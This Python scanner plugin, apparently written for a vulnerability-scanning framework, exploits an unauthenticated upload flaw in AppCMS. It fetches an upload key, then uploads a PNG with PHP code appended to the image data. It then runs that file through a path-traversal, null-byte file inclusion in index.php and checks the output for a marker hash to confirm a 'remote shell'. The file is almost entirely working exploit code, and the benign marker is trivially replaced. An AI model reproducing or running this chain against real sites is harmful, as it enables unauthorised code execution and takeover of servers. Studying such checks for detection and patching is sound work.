#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#refer :http://www.wooyun.org/bugs/wooyun-2010-070493

import re
def assign(service, arg):
    if service == "appcms":
        return True, arg

def getKey(arg):
    
    url = arg + "upload/upload_form.php"

    code, head, res, errcode,finalurl =  curl.curl(url)
    keys = re.findall(r"params=&v=([^']+)'", res)
    if len(keys) == 0:
        return ""
    return keys[0]

def uploadShell(arg, key):
    path = "upload/upload_file.php?params=%7B%22func%22%3A%22callback_upload_waplogo%22%2C%22thumb%22%3A%7B%22width%22%3A%22300%22%2C%22height%22%3A%22300%22%7D%2C%22domain%22%3A%22test.com%22%7D&v="
    path += key
    url = arg + path
    header = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryc4J7mjfUlDwBQaFF\r\n'
    payload = '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00g\x00\x00\x00B\x08\x06\x00\x00\x00J \xc8|\x00\x00\x00\x01sRGB\x00\xae\xce\x1c\xe9\x00\x00\x00\x04gAMA\x00\x00\xb1\x8f\x0b\xfca\x05\x00\x00\x00\tpHYs\x00\x00\x0e\xc3\x00\x00\x0e\xc3\x01\xc7o\xa8d\x00\x00\x00\xa4IDATx^\xed\xd11\x01\x00\x00\x0c\xc3\xa0\xf97\xdd\xd9\xe0\x08\x16\xb8\x85U\x0e\xac\x1cX9\xb0r`\xe5\xc0\xca\x81\x95\x03+\x07V\x0e\xac\x1cX9\xb0r`\xe5\xc0\xca\x81\x95\x03+\x07V\x0e\xac\x1cX9\xb0r`\xe5\xc0\xca\x81\x95\x03+\x07V\x0e\xac\x1cX9\xb0r`\xe5\xc0\xca\x81\x95\x03+\x07V\x0e\xac\x1cX9\xb0r`\xe5\xc0\xca\x81\x95\x03+\x07V\x0e\xac\x1cX9\xb0r`\xe5\xc0\xca\x81\x95\x03+\x07V\x0e\xac\x1cX9\xb0r`\xe5\xc0\xca\x81\x95\x03+\x07V\x0e\xac\x1cX9\xb0r`\xe5\xc0\xca\x81\x95\x03+\x07V\x0ek{\xfa\xa8\xd3\xf0\xe7y\xffa\x00\x00\x00\x00IEND\xaeB`\x82<?print(md5(0x22))?>'
    data = '------WebKitFormBoundaryc4J7mjfUlDwBQaFF\r\n'
    data += 'Content-Disposition: form-data; name="file"; filename="tu2.png\r\n"'
    data += 'Content-Type: image/png\r\n\r\n'
    data += payload + "\r\n"
    data += '------WebKitFormBoundaryc4J7mjfUlDwBQaFF--'
    code, head, res, errcode,finalurl =  curl.curl('"' + url + '" -H ' +"'"+ header +"'" +" -d '" +data + "'")

    rst = re.findall(r"upload%5C%2Fimg%5C%2F([\d]{4})%5C%2F([\d]{2})%5C%2F([\d]{2})%5C%2F([^\.]+)\.png", res)
    if len(rst) == 0:
        return ""
    shell = "upload/img/"
    y,m,d,n = rst[0]
    shell = shell + y + "/"
    shell = shell + m + "/"
    shell = shell + d + "/"
    shell = shell + n
    return shell + ".png"

def audit(arg):
    key = getKey(arg)
    if key == "":
        return
    shell = uploadShell(arg, key)
    if shell == "":
        return
    checkURL = arg + "index.php?tpl=../../"+shell+"%00" #gpc要为off
    #code, head, res, errcode,finalurl =  curl.curl('"' + url + '"' + " -H " +data)

    code, head, res, errcode,finalurl =  curl.curl(checkURL)
    if res.find("e369853df766fa44e1ed0ff613f563bd") != -1:
        security_hole('appcms unauthentication remote shell: ' + checkURL)

if __name__ == '__main__':
    from dummy import *
    audit(assign('appcms', 'http://127.0.0.1/appcms/')[1])